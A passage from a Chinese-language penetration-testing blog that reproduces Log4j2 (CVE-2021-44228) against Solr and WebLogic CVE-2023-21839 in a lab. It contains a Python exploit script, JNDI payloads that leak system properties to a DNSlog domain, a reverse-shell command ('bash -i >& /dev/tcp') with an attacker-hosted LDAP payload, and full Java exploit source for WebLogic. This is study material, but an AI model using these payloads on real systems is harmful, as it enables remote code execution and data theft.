<p><code>parse_args()</code> 方法用于解析命令行参数，并将解析后的参数值存储在一个名为 <code>args</code> 的变量中</p>
<p>例如，在执行脚本后加的命令行参数<code>--listen-port 8080</code>就转变为了<code>args.listen_port = 8080</code>，这样在后续</p>
<p>代码调用不同参数时，可直接调用<code>arg</code>来实现</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">args = parser.parse_args()</span><br></pre></td></tr></table></figure>



<p>这里先创建一个基于线程的 <code>TCP</code> 服务器，并使用 <code>args.listen_host</code> 和 <code>args.listen_port</code> 来指定的主机和端</p>
<p>口启动，并使用 <code>ThreadedTCPRequestHandler</code> 类来处理每个请求【也就是前面提到的】</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27; i| starting server on <span class="subst">&#123;args.listen_host&#125;</span>:<span class="subst">&#123;args.listen_port&#125;</span>&#x27;</span>)</span><br><span class="line">    server = ThreadedTCPServer((args.listen_host, args.listen_port),</span><br><span class="line">ThreadedTCPRequestHandler)</span><br></pre></td></tr></table></figure>



<p>这里主要是先创建一个 <code>threading.Thread</code> 对象，并将服务器的 <code>serve_forever()</code> 方法作为其目标。这个方法</p>
<p>就是字面意思，它会一直运行，直到服务器被关闭。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">serv_thread = threading.Thread(target=server.serve_forever)</span><br></pre></td></tr></table></figure>



<p><code>daemon</code> 属性是 <code>Python</code> 中的线程特有属性，它表示该线程是否为守护线程，如果一个线程是守护线程，</p>
<p>那么当程序退出时，它也会被中断。</p>
<p>而这里的被设置为<code>ture</code>，所以这意味着程序退出时，线程将被中断。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">serv_thread.daemon = <span class="literal">True</span></span><br></pre></td></tr></table></figure>



<p>然后就是启动线程，并延迟 <code>1</code> 秒钟，来确保服务器完全启动</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">serv_thread.start()</span><br><span class="line">time.sleep(<span class="number">1</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27; i| server started&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">f&#x27;$&#123;&#123;jndi:ldap://<span class="subst">&#123;args.exploit_host&#125;</span>:<span class="subst">&#123;args.listen_port&#125;</span>/<span class="subst">&#123;args.leak&#125;</span>&#125;&#125;&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27; i| sending exploit payload <span class="subst">&#123;payload&#125;</span> to <span class="subst">&#123;args.target&#125;</span>&#x27;</span>)</span><br></pre></td></tr></table></figure>



<p>这里使用 <code>try-finally</code> 语句块向服务器发送<code>payload</code>:</p>
<p><code>$&#123;&#123;jndi:ldap://&#123;args.exploit_host&#125;:&#123;args.listen_port&#125;/&#123;args.leak&#125;&#125;&#125;</code></p>
<p>并打印服务器的响应状态码，以及响应的文本内容</p>
<p>最后调用服务器的 <code>shutdown()</code> 和 <code>server_close()</code> 方法，以关闭服务器，即使在发送 <code>HTTP</code> 请求时发生异常也是如此。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    r = requests.get(args.target, headers=&#123;<span class="string">&#x27;User-Agent&#x27;</span>: payload&#125;)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27; i| response status code: <span class="subst">&#123;r.status_code&#125;</span>&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27; i| response: <span class="subst">&#123;r.text&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27; e| failed to make request: <span class="subst">&#123;e&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="keyword">finally</span>:</span><br><span class="line">    server.shutdown()</span><br><span class="line">    server.server_close()</span><br></pre></td></tr></table></figure>

<p>这里就是一个常见的语句，如果脚本是独立执行的，则直接就调用 <code>main()</code> 函数。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()    </span><br></pre></td></tr></table></figure>

<h2 id="渗透测试"><a href="#渗透测试" class="headerlink" title="渗透测试"></a>渗透测试</h2><h3 id="利用DNSlog验证漏洞"><a href="#利用DNSlog验证漏洞" class="headerlink" title="利用DNSlog验证漏洞"></a>利用DNSlog验证漏洞</h3><p>访问<code>http://www.dnslog.cn/</code></p>
<p>先<code>Get SubDomain</code>获取一个子域名</p>
<p><a data-fancybox="gallery" data-src="/CVE-Test/image-20221220145121926.png"><img src="/CVE-Test/image-20221220145121926.png" alt="image-20221220145121926"></a></p>
<p>但是既然是注入，那肯定是存在参数注入点，查看官方<code>solr</code>文档，得到在<code>cores</code>里</p>
<p><a data-fancybox="gallery" data-src="/CVE-Test/image-20221220145505204.png"><img src="/CVE-Test/image-20221220145505204.png" alt="image-20221220145505204"></a></p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line"><span class="regexp">/admin/</span>cores?action=</span><br></pre></td></tr></table></figure>

<p>其中<code>action</code>参数可控，有很大可能是注入点</p>
<p>于是把我们的<code>dnslog</code>获取的子域名按<code>payload</code>形式添加到<code>url</code>后参数中</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">http:<span class="regexp">//</span><span class="number">192.168</span>.<span class="number">80.131</span>:<span class="number">8983</span><span class="regexp">/solr/</span>admin<span class="regexp">/cores?action=$&#123;jndi:ldap:/</span>/<span class="number">4</span>d5do5.dnslog.cn&#125;</span><br></pre></td></tr></table></figure>

<p>访问查看</p>
<p><code>DNSlog</code>收到了访问请求</p>
<p><a data-fancybox="gallery" data-src="/CVE-Test/image-20221220145131607.png"><img src="/CVE-Test/image-20221220145131607.png" alt="image-20221220145131607"></a></p>
<p>同时在靶机页面下也有<code>DNSlog</code>子域名回显，虽然是</p>
<p><a data-fancybox="gallery" data-src="/CVE-Test/image-20221220145054026.png"><img src="/CVE-Test/image-20221220145054026.png" alt="image-20221220145054026"></a></p>
<p>说明这里的<code>$&#123;jndi:ldap://eavgk6.dnslog.cn&#125;</code>，确实达到了访问的作用</p>
<p>故此推断<code>log4j2</code>漏洞存在</p>
<h3 id="信息泄露漏洞"><a href="#信息泄露漏洞" class="headerlink" title="信息泄露漏洞"></a>信息泄露漏洞</h3><p>这里可以利用脚本分析中<code>exploitdb</code>里的信息泄露脚本即可</p>
<p>按照脚本原理也是利用占位符，也就是<code>payload</code>的形式，但是参数为系统属性，这些属性会自动返回对应的值，</p>
<p>最后脚本通过对返回数据的解析，就可以得到敏感数据</p>
<p>当然直接通过访问得到消息也是可以的</p>
<p>比如<code>$&#123;sys:os.version&#125;</code>，就得到我们靶机的系统内核版本号为<code>5.15.0-56-generic</code></p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">http:<span class="regexp">//</span><span class="number">192.168</span>.<span class="number">80.131</span>:<span class="number">8983</span><span class="regexp">/solr/</span>admin<span class="regexp">/cores?action=$&#123;jndi:ldap:/</span>/<span class="variable">$&#123;sys:os.version&#125;</span>.<span class="number">7</span>b09py.dnslog.cn&#125;</span><br></pre></td></tr></table></figure>

<p><a data-fancybox="gallery" data-src="/CVE-Test/image-20221220220840849.png"><img src="/CVE-Test/image-20221220220840849.png" alt="image-20221220220840849"></a></p>
<p>对于<code>usr.name</code>，以及<code>os.name</code>等等都是可以实现</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">http:<span class="regexp">//</span><span class="number">192.168</span>.<span class="number">80.131</span>:<span class="number">8983</span><span class="regexp">/solr/</span>admin<span class="regexp">/cores?action=$&#123;jndi:ldap:/</span>/<span class="variable">$&#123;sys:user.name&#125;</span>.<span class="number">7</span>b09py.dnslog.cn&#125;</span><br></pre></td></tr></table></figure>



<p><a data-fancybox="gallery" data-src="/CVE-Test/image-20221220175405653.png"><img src="/CVE-Test/image-20221220175405653.png" alt="image-20221220175405653"></a></p>
<p>以下就是在<code>log4j2</code>其他可用系统属性列表</p>
<p><a data-fancybox="gallery" data-src="/CVE-Test/image-20221220170944260.png"><img src="/CVE-Test/image-20221220170944260.png" alt="image-20221220170944260"></a></p>
<h3 id="远程代码执行漏洞"><a href="#远程代码执行漏洞" class="headerlink" title="远程代码执行漏洞"></a>远程代码执行漏洞</h3><figure class="highlight armasm"><table><tr><td class="code"><pre><span class="line">攻击机kali <span class="built_in">ip</span>:<span class="number">192</span>.<span class="number">168</span>.<span class="number">80</span>.<span class="number">128</span></span><br><span class="line">攻击机kali 监听端口:<span class="number">8888</span></span><br><span class="line">靶机ubuntu <span class="built_in">ip</span>:<span class="number">192</span>.<span class="number">168</span>.<span class="number">80</span>.<span class="number">131</span></span><br></pre></td></tr></table></figure>

<h4 id="JNDIExploit-1-2-SNAPSHOT-jar利用JNDI注入反弹shell"><a href="#JNDIExploit-1-2-SNAPSHOT-jar利用JNDI注入反弹shell" class="headerlink" title="JNDIExploit-1.2-SNAPSHOT.jar利用JNDI注入反弹shell"></a>JNDIExploit-1.2-SNAPSHOT.jar利用JNDI注入反弹shell</h4><p>该工具的原理我剖析了一下，</p>
<p>先启动工具</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">java</span> -jar JNDIExploit-<span class="number">1</span>.<span class="number">2</span>-SNAPSHOT.jar -i <span class="number">192.168.80.128</span></span><br></pre></td></tr></table></figure>

<p><a data-fancybox="gallery" data-src="/CVE-Test/image-20221221163132059.png"><img src="/CVE-Test/image-20221221163132059.png" alt="image-20221221163132059"></a></p>
<p>简单来讲就是在攻击机【<code>192.168.80.128</code>】的<code>1389</code>端口搭建起了一个服务器，其中放置了一个恶意类，</p>
<p>通过利用靶机网站<code>JNDI</code>注入漏洞把这个恶意类进行远程加载，从而执行了命令</p>
<p>利用<code>JNDIExploit-1.2-SNAPSHOT.jar</code>最好的就是简化了<code>1.0</code>的繁杂参数</p>
<p>只需要构造<code>payload</code></p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">http:<span class="regexp">//</span><span class="number">192.168</span>.<span class="number">80.131</span>:<span class="number">8983</span><span class="regexp">/solr/</span>admin<span class="regexp">/cores?action=$&#123;jndi:ldap:/</span><span class="regexp">/192.168.80.128:1389/</span>Basic<span class="regexp">/ReverseShell/</span><span class="number">192.168</span>.<span class="number">80.128</span>/<span class="number">6666</span>&#125;</span><br></pre></td></tr></table></figure>

<p><code>/Basic/ReverseShell/</code>中其实就包含反弹<code>shell</code>的命令</p>
<figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line">bash -<span class="selector-tag">i</span> &gt;&amp; /dev/tcp/xx<span class="selector-class">.xx</span><span class="selector-class">.xx</span>.xx/xxxx <span class="number">0</span>&gt;&amp;<span class="number">1</span></span><br><span class="line">*这里的</span><br><span class="line">/xx<span class="selector-class">.xx</span><span class="selector-class">.xx</span>.xx/xxxx</span><br><span class="line">就是其后跟上的参数</span><br><span class="line">/<span class="number">192.168</span>.<span class="number">80.128</span>/<span class="number">6666</span></span><br></pre></td></tr></table></figure>

<p>于是就是<code>/Basic/ReverseShell/192.168.80.128/6666</code>被恶意类包含</p>
<p>然后在攻击机监听<code>6666</code>端口</p>
<p><a data-fancybox="gallery" data-src="/CVE-Test/image-20221221203418508.png"><img src="/CVE-Test/image-20221221203418508.png" alt="image-20221221203418508"></a></p>
<p>最后访问<code>payload</code>，触发</p>
<p><a data-fancybox="gallery" data-src="/CVE-Test/image-20221221203458628.png"><img src="/CVE-Test/image-20221221203458628.png" alt="image-20221221203458628"></a></p>
<p>成功反弹到<code>shell</code></p>
<p><a data-fancybox="gallery" data-src="/CVE-Test/image-20221221203538282.png"><img src="/CVE-Test/image-20221221203538282.png" alt="image-20221221203538282"></a></p>
<p>测试完毕</p>
<h1 id="CVE-2023-21839-Weblogic远程代码执行漏洞"><a href="#CVE-2023-21839-Weblogic远程代码执行漏洞" class="headerlink" title="CVE-2023-21839 Weblogic远程代码执行漏洞"></a>CVE-2023-21839 Weblogic远程代码执行漏洞</h1><h2 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h2><p>该漏洞的影响范围为<code>Weblogic 12.2.1.3.0, 12.2.1.4.0, 14.1.1.0.0</code></p>
<p>先在官方的进行修复更新文档中进行查看</p>
<blockquote>
<p><a href="https://www.oracle.com/security-alerts/cpujan2023.html">Oracle Critical Patch Update Advisory - January 2023</a></p>
</blockquote>
<p><a data-fancybox="gallery" data-src="/CVE-Test/image-20230226154457424.png"><img src="/CVE-Test/image-20230226154457424.png" alt="image-20230226154457424"></a></p>
<table>
<thead>
<tr>
<th align="left">CVE-2023-21839</th>
<th>Oracle WebLogic Server</th>
<th>核心</th>
<th>T3， IIOP</th>
<th>是的</th>
<th>7.5</th>
<th>网络</th>
<th>低</th>
<th>没有</th>
<th>没有</th>
<th>未 更改</th>
<th>高</th>
<th>没有</th>
<th>没有</th>
<th>12.2.1.3.0 12.2.1.4.0 14.1.1.0.0</th>
</tr>
</thead>
<tbody><tr>
<td align="left">CVE-id</td>
<td>产品</td>
<td>元件</td>
<td>协议</td>
<td>无需身份验证即可远程利用。</td>
<td>评分</td>
<td>攻击向量</td>
<td>攻复合体</td>
<td>Privs’Req[权限提提升]</td>
<td>用户交互</td>
<td>范围</td>
<td>倾诉</td>
<td>内涵</td>
<td>可用性</td>
<td>版本</td>
</tr>
</tbody></table>
<h3 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h3><h4 id="weblogic是什么？"><a href="#weblogic是什么？" class="headerlink" title="weblogic是什么？"></a>weblogic是什么？</h4><blockquote>
<p>WebLogic是<a href="https://baike.baidu.com/item/%E7%BE%8E%E5%9B%BDOracle%E5%85%AC%E5%8F%B8/9952086?fromModule=lemma_inlink">美国Oracle公司</a>出品的一个application server，确切的说是一个基于<a href="https://baike.baidu.com/item/JAVAEE/3066623?fromModule=lemma_inlink">JAVAEE</a>架构的<a href="https://baike.baidu.com/item/%E4%B8%AD%E9%97%B4%E4%BB%B6/452240?fromModule=lemma_inlink">中间件</a>，WebLogic是用于开发、集成、部署和管理大型分布式Web应用、<a href="https://baike.baidu.com/item/%E7%BD%91%E7%BB%9C%E5%BA%94%E7%94%A8/2196523?fromModule=lemma_inlink">网络应用</a>和<a href="https://baike.baidu.com/item/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%BA%94%E7%94%A8/10563731?fromModule=lemma_inlink">数据库应用</a>的<a href="https://baike.baidu.com/item/Java/85979?fromModule=lemma_inlink">Java</a>应用服务器。将Java的动态功能和Java Enterprise标准的安全性引入大型网络应用的开发、集成、部署和管理之中。</p>
</blockquote>
<h4 id="T3的概念和交互过程"><a href="#T3的概念和交互过程" class="headerlink" title="T3的概念和交互过程"></a>T3的概念和交互过程</h4><blockquote>
<p>T3也称为丰富套接字，是BEA内部协议，功能丰富，可扩展性好。T3是多工双向和异步协议，经过高度优化，只使用一个套接字和一条线程。借助这种方法，基于Java的客户端可以根据服务器方需求使用多种<code>RMI</code>对象，但仍使用一个套接字和一条线程。这也为我们静态分析t3协议带来了很多麻烦</p>
<p>RMI在log4j中提到，它是一个调用远程类的一个Java的方法</p>
</blockquote>
<p><strong>交互方式</strong></p>
<p><a data-fancybox="gallery" data-src="/CVE-Test/image-20230226152124965.png"><img src="/CVE-Test/image-20230226152124965.png" alt="image-20230226152124965"></a></p>
<h4 id="iiop概念"><a href="#iiop概念" class="headerlink" title="iiop概念"></a>iiop概念</h4><blockquote>
<p>用来在CORBA<a href="https://baike.baidu.com/item/%E5%AF%B9%E8%B1%A1%E8%AF%B7%E6%B1%82%E4%BB%A3%E7%90%86?fromModule=lemma_inlink">对象请求代理</a>之间交流的协议。Java中使得程序可以和其他语言的CORBA实现<a href="https://baike.baidu.com/item/%E4%BA%92%E6%93%8D%E4%BD%9C%E6%80%A7?fromModule=lemma_inlink">互操作性</a>的协议。</p>
<p>这个协议的最初阶段是要建立以下几个组件部分：一个IIOP到HTTP的<a href="https://baike.baidu.com/item/%E7%BD%91%E5%85%B3?fromModule=lemma_inlink">网关</a>，使用这个网关可以让CORBA客户访问WWW资源；一个HTTP到IIOP的网关，通过这个网关可以访问CORBA资源；一个为IIOP和HTTP提供资源的服务器，一个能够将IIOP作为可识别协议的浏览器。</p>
</blockquote>
<h4 id="什么是CORBA"><a href="#什么是CORBA" class="headerlink" title="什么是CORBA"></a>什么是CORBA</h4><blockquote>
<p>CORBA（Common ObjectRequest Broker Architecture公共对象请求代理体系结构）是由<a href="https://baike.baidu.com/item/OMG/3041465?fromModule=lemma_inlink">OMG</a>组织制订的一种标准的<a href="https://baike.baidu.com/item/%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1/2262089?fromModule=lemma_inlink">面向对象</a>应用程序体系规范。或者说CORBA体系结构是对象管理组织（OMG）为解决<a href="https://baike.baidu.com/item/%E5%88%86%E5%B8%83%E5%BC%8F%E5%A4%84%E7%90%86/3352171?fromModule=lemma_inlink">分布式处理</a>环境(DCE)中，硬件和软件系统的互连而提出的一种解决方案；OMG组织是一个国际性的<a href="https://baike.baidu.com/item/%E9%9D%9E%E7%9B%88%E5%88%A9%E7%BB%84%E7%BB%87/5622954?fromModule=lemma_inlink">非盈利组织</a>，其职责是为<a href="https://baike.baidu.com/item/%E5%BA%94%E7%94%A8/3994271?fromModule=lemma_inlink">应用</a>开发提供一个公共框架，制订工业指南和对象管理规范，加快对象技术的发展。</p>
</blockquote>
<h3 id="环境搭建-1"><a href="#环境搭建-1" class="headerlink" title="环境搭建"></a>环境搭建</h3><p>从官网下载<code>Weblogic 12.2.1.3.0</code></p>
<p><code>https://www.oracle.com/middleware/technologies/weblogic-server-installers-downloads.html</code></p>
<p><a data-fancybox="gallery" data-src="/CVE-Test/image-20230226141556869.png"><img src="/CVE-Test/image-20230226141556869.png" alt="image-20230226141556869"></a></p>
<p>然后解压其中的jar包，然后到<code>/disk1/install</code>下执行cmd脚本就行</p>
<p>但是需要注意，由于<code>Weblogic</code>中的<code>maven</code>的存在，其识别<code>jdk</code>时，只针对环境变量名<code>JAVA_HOME</code>的路径进行识别，而如果是在PATH中配置的，会报错找不到<code>java</code>环境的位置</p>
<figure class="highlight subunit"><table><tr><td class="code"><pre><span class="line"><span class="keyword">ERROR: </span>Cannot determine the Java Home ERROR: Specify the -jreLoc option</span><br></pre></td></tr></table></figure>

<p><a data-fancybox="gallery" data-src="/CVE-Test/image-20230226142921961.png"><img src="/CVE-Test/image-20230226142921961.png" alt="image-20230226142921961"></a></p>
<p>然后再次管理员执行时发现失败，查看报错日志</p>
<blockquote>
<p>java.lang.NullPointerException: Cannot invoke “java.lang.<strong><code>reflect.Method</code></strong>.invoke(Object, Object[])” because “com.sun.<code>xml.bind</code>.v2.runtime.reflect.opt.Injector.defineClass” <strong><code>is null</code></strong>[[</p>
</blockquote>
<p>猜测应该是我的<code>java</code>自身的问题</p>
<p>从<code>stack</code>中了解到了，在<code>java9</code>的时候，<code>JAXB</code>（Java Architecture for XML Binding）<code>[java映射为xml的表示方式]</code> </p>
<p>在<code>java9</code>已经被标记为弃用，在<code>java11</code>的时候已经被删除，所以需要换到低版本的<code>java</code>或者在依赖项添加<code>xml</code>库，让其重新映射</p>
<p><a href="https://javaalmanac.io/jdk/11/apidiff/9/">New APIs in Java 11 - javaalmanac.io</a></p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.sun.xml.bind<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>jaxb-impl<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.3.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.sun.xml.messaging.saaj<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>saaj-impl<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.5.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>【建议下载jdk8低版本最方便，记得再次修改JAVA_HOME环境变量】</p>
<blockquote>
<p>注意，这个和log4j的原因一样，是加载远程恶意类导致远程命令的执行，所以对java是否开启加载远程类，也就是要注意对应的版本</p>
<p>版本≤ <code>JDK 6u211、7u201、 8u191、11.0.1</code></p>
<p>所以我这里复现的环境和apache的log4j2一样，是<code>JDK-8u171</code>，配置方式如cve-2021-44228</p>
</blockquote>
<p>安装搭建按流程按引导</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">http://localhost:7001/console</span><br></pre></td></tr></table></figure>

<p><a data-fancybox="gallery" data-src="/CVE-Test/image-20230226165115723.png"><img src="/CVE-Test/image-20230226165115723.png" alt="image-20230226165115723"></a></p>
<h3 id="渗透流程"><a href="#渗透流程" class="headerlink" title="渗透流程"></a>渗透流程</h3><p>这是2023年一月的洞，我是二月复现的，目前大致就两种payload工具，一个<code>java</code>的，一个<code>go</code></p>
<p>仔细分析一下漏洞的利用条件和形成原因，以及两个工具的脚本的原理</p>
<blockquote>
<p>go的<a href="https://github.com/4ra1n/CVE-2023-21839">4ra1n&#x2F;CVE-2023-21839: Weblogic CVE-2023-21839 RCE (无需Java依赖一键RCE) (github.com)</a></p>
<p>java的<a href="https://github.com/DXask88MA/Weblogic-CVE-2023-21839">DXask88MA&#x2F;Weblogic-CVE-2023-21839 (github.com)</a></p>
</blockquote>
<p>两者大差不差，但是个人感觉go更舒服一些</p>
<blockquote>
<p>在公网上，IIOP协议和NAT转换之间存在冲突的网络问题，</p>
<p>一般只能修改源码或者尝试<strong>iiop协议net绕过</strong><a href="https://xz.aliyun.com/t/8508">Weblogic IIOP 协议NAT 网络绕过 - 先知社区 (aliyun.com)</a></p>
<p>【冲突原因学习记在keynotes上，大致就是两者之间的ip指向和ip转换冲突，一个根据自身规则发送数据到私网ip，另一个根据自身规则把私网ip又变为公网ip，从而通讯连接失败】</p>
<p>用go进行重写iiop的一些协议，从而避免在对公网或者docker进行操作的时候出现连接网络错误，当然java也是可以修改iiop规则的，视情况和能力而定</p>
</blockquote>
<h4 id="远程代码执行原理"><a href="#远程代码执行原理" class="headerlink" title="远程代码执行原理"></a>远程代码执行原理</h4><blockquote>
<p>利用该漏洞允许未经身份验证的攻击者通过 <code>T3、IIOP</code> 进行网络访问，从而危害 Oracle WebLogic Server。成功攻击此漏洞可导致未经授权访问<code>关键数据或完全访问所有 Oracle WebLogic Server 可访问数据</code>。</p>
</blockquote>
<h4 id="JAVA"><a href="#JAVA" class="headerlink" title="JAVA"></a>JAVA</h4><p>（不好的就是需要对应java版本跑，每个版本Java都要删去一些东西，还是go整洁的包舒服）</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> javax.naming.Context;</span><br><span class="line"><span class="keyword">import</span> javax.naming.InitialContext;</span><br><span class="line"><span class="keyword">import</span> javax.naming.NamingException;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.Hashtable;</span><br><span class="line"><span class="keyword">import</span> java.util.Random;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CVE_2023_21839</span> &#123;</span><br><span class="line">    <span class="comment">// JNDI_FACTORY类，用于创建InitialContext</span></span><br><span class="line">    <span class="keyword">static</span> <span class="type">String</span> <span class="variable">JNDI_FACTORY</span> <span class="operator">=</span> <span class="string">&quot;weblogic.jndi.WLInitialContextFactory&quot;</span>;</span><br><span class="line">    <span class="comment">// 使用说明</span></span><br><span class="line">    <span class="keyword">static</span> <span class="type">String</span> <span class="variable">HOW_TO_USE</span> <span class="operator">=</span> <span class="string">&quot;[*]java -jar 目标ip:端口 ldap地址\n&quot;</span> +</span><br><span class="line">            <span class="string">&quot;e.g. java -jar 192.168.220.129:7001 ldap://192.168.31.58:1389/Basic/ReverseShell/192.168.220.129/1111&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 获取InitialContext对象</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> InitialContext <span class="title function_">getInitialContext</span><span class="params">(String url)</span> <span class="keyword">throws</span> NamingException &#123;</span><br><span class="line">        <span class="comment">// 设置JNDI环境参数</span></span><br><span class="line">        Hashtable&lt;String, String&gt; env = <span class="keyword">new</span> <span class="title class_">Hashtable</span>&lt;String, String&gt;();</span><br><span class="line">        env.put(Context.INITIAL_CONTEXT_FACTORY, JNDI_FACTORY);</span><br><span class="line">        env.put(Context.PROVIDER_URL, url);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">InitialContext</span>(env);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 主函数</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String args[])</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">// 检查命令行参数是否足够</span></span><br><span class="line">        <span class="keyword">if</span> (args.length &lt; <span class="number">2</span>) &#123;</span><br><span class="line">            System.out.println(HOW_TO_USE);</span><br><span class="line">            System.exit(<span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 从命令行参数获取t3协议地址和LDAP地址</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">t3Url</span> <span class="operator">=</span> args[<span class="number">0</span>];</span><br><span class="line">        <span class="type">String</span> <span class="variable">ldapUrl</span> <span class="operator">=</span> args[<span class="number">1</span>];</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 创建t3协议的InitialContext</span></span><br><span class="line">        <span class="type">InitialContext</span> <span class="variable">c</span> <span class="operator">=</span> getInitialContext(<span class="string">&quot;t3://&quot;</span> + t3Url);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 设置新的JNDI环境参数</span></span><br><span class="line">        Hashtable&lt;String, String&gt; env = <span class="keyword">new</span> <span class="title class_">Hashtable</span>&lt;String, String&gt;();</span><br><span class="line">        env.put(Context.INITIAL_CONTEXT_FACTORY, <span class="string">&quot;com.sun.jndi.rmi.registry.RegistryContextFactory&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 创建ForeignOpaqueReference对象</span></span><br><span class="line">        weblogic.deployment.jms.<span class="type">ForeignOpaqueReference</span> <span class="variable">f</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">weblogic</span>.deployment.jms.ForeignOpaqueReference();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 使用反射获取并设置ForeignOpaqueReference的私有字段jndiEnvironment</span></span><br><span class="line">        <span class="type">Field</span> <span class="variable">jndiEnvironment</span> <span class="operator">=</span> weblogic.deployment.jms.ForeignOpaqueReference.class.getDeclaredField(<span class="string">&quot;jndiEnvironment&quot;</span>);</span><br><span class="line">        jndiEnvironment.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        jndiEnvironment.set(f, env);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 使用反射获取并设置ForeignOpaqueReference的私有字段remoteJNDIName</span></span><br><span class="line">        <span class="type">Field</span> <span class="variable">remoteJNDIName</span> <span class="operator">=</span> weblogic.deployment.jms.ForeignOpaqueReference.class.getDeclaredField(<span class="string">&quot;remoteJNDIName&quot;</span>);</span><br><span class="line">        remoteJNDIName.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        remoteJNDIName.set(f, ldapUrl);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 生成一个随机的绑定名</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">bindName</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Random</span>(System.currentTimeMillis()).nextLong() + <span class="string">&quot;&quot;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// 尝试绑定ForeignOpaqueReference对象到InitialContext</span></span><br><span class="line">            c.bind(bindName, f);</span><br><span class="line">            <span class="comment">// 尝试查找绑定的对象</span></span><br><span class="line">            c.lookup(bindName);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            <span class="comment">// 异常处理，可以根据实际情况修改</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

